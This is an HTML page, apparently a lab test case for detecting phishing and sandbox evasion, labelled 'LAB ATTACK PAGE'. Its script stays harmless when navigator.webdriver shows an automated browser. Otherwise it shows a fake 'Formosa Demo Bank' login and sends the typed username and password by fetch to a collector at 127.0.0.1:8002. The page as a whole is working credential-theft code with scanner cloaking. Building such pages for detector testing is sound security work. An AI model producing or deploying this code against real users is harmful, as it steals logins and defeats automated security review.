<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Device check</title></head>   <!-- generic at load: no brand, no sensitive field -->
<body>
  <h1>Verifying your device...</h1>
  <p style="color:#a00">LAB ATTACK PAGE - sandbox/decoy-aware (open case 2): reveals the real login ONLY for
     a non-automated session; an automated probe sees only this benign page. Fake data only.</p>
  <div id="slot"></div>
  <script>
    // Open case 2: behave benign under automation (a decoy/sandbox probe); leak only for a real user.
    setTimeout(() => {
      if (navigator.webdriver) return;                   // automated probe -> stay benign, reveal nothing
      document.title = "Formosa Demo Bank - Sign in";    // real session: reveal the real (impersonated) login
      document.getElementById("slot").innerHTML =
        '<input name="username" placeholder="Username">' +
        '<input name="password" type="password" placeholder="Password">' +
        '<button type="button" id="signin">Sign in</button>';
      document.getElementById("signin").addEventListener("click", () => {
        const u = document.querySelector('input[name="username"]').value;
        const p = document.querySelector('input[name="password"]').value;
        fetch("http://127.0.0.1:8002/collect", {           // cross-site exfil
          method: "POST",
          headers: {"Content-Type": "application/x-www-form-urlencoded"},
          body: "username=" + u + "&password=" + p,
        });
      });
    }, 1200);
  </script>
</body></html>
